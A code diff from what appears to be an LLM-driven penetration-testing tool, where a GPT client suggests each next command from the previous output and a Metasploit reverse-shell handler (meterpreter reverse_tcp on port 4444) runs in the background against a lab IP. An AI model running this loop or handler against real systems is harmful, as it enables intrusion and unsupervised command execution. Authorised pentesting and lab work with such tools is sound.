+            analysis_prompt = (
+                f"The command `{command}` returned:\n"
+                f"Status: {result['status']}\n"
+                f"Output:\n```\n{result.get('message')}\n```\n"
+                "Please analyze this and suggest the next command or steps."
+            )
+            gpt_response = self.gpt_client.send_message(analysis_prompt)
 
+            time.sleep(2)  # Sleep to avoid spamming requests
+            # 5) Reset retry count on successful command
+            if result["status"] == "success":
+                retry_count = 0
+            else:
+                retry_count += 1
 
-
-
-
-
+        # End main workflow
+        logger.info("Main workflow finished. Stopping Metasploit if running.")
+        self.ms_stop_event.set()
+        if self.ms_manager:
+            self.ms_manager.join()
 
     def save_history(self):
         """
-        Save the conversation history to a log file.
+        Save GPT history and executed commands to the log directory.
         """
         timestamp = time.strftime("%Y%m%d_%H%M%S")
-        log_file = os.path.join(self.log_dir, f"pentestGPT_log_{timestamp}.json")
-        with open(log_file, "w") as f:
-            json.dump(self.history, f, indent=2)
-        self.console.print(f"History saved to {log_file}", style="bold green")
+        # Save GPT conversation
+        gpt_log = os.path.join(self.log_dir, f"gpt_history_{timestamp}.json")
+        with open(gpt_log, "w") as f:
+            json.dump(self.gpt_client.history, f, indent=2)
+        logger.info(f"GPT history saved to {gpt_log}")
+
+        # Save commands executed
+        cmd_log = os.path.join(self.log_dir, f"commands_executed_{timestamp}.json")
+        with open(cmd_log, "w") as f:
+            json.dump(self.commands_executed, f, indent=2)
+        logger.info(f"Command execution log saved to {cmd_log}")
 
 
 if __name__ == "__main__":
-    target_ip = "192.168.1.1"
-    target_description = "A sample target for penetration testing."
-    pentest = MallanooSploit(target_ip, target_description)
-    pentest.start_conversation()
-    pentest.save_history()
+    # Example usage
+    target_ip = "10.10.10.40"
+    target_desc = "A sample target for penetration testing"
+    my_ip = "10.10.14.3"
+
+    orchestrator = PentestOrchestrator(target_ip, target_desc, my_ip)
+    orchestrator.initialize()
+
+    # (Optional) Start Metasploit in background:
+    # In real usage, you'd dynamically create or fetch the resource script from GPT
+    sample_msf_script = f"""
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST {my_ip}
+set LPORT 4444
+exploit -j
+"""
+    orchestrator.start_background_metasploit(sample_msf_script)
+
+    # Start the main GPT-driven workflow
+    orchestrator.main_workflow()
+
+    # Save logs at the end
+    orchestrator.save_history()
